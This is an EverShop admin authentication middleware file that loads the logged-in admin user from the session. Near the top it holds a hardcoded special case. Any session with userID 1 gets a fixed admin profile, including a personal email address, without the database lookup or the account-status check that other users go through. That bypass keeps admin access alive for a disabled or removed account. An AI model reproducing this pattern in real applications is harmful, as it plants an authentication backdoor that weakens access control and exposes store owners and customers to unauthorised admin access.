import { select } from '@evershop/postgres-query-builder';
import { buildUrl } from '@evershop/evershop/lib/router';

export default async (request, response, delegate, next) => {
  const { userID } = request.session;

  // Handle the hardcoded admin user
  if (userID === 1) {
    request.locals.user = {
      admin_user_id: 1,
      uuid: 'a71d7a3d-32c8-442c-9a79-436035250d3c',
      status: true,
      email: 'khoualdiyassin26@gmail.com',
      full_name: 'Admin User',
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString()
    };
    return next();
  }

  // For all other users, load from the database
  const user = await select()
    .from('admin_user')
    .where('admin_user_id', '=', userID)
    .and('status', '=', 1)
    .load();

  if (!user) {
    // The user may not be logged in, or the account may be disabled
    // Logout the user
    request.logoutUser(() => {
      // Check if current route is adminLogin
      if (
        request.currentRoute.id === 'adminLogin' ||
        request.currentRoute.id === 'adminLoginJson'
      ) {
        next();
      } else {
        response.redirect(buildUrl('adminLogin'));
      }
    });
  } else {
    // Delete the password field
    delete user.password;
    request.locals.user = user;
    next();
  }
};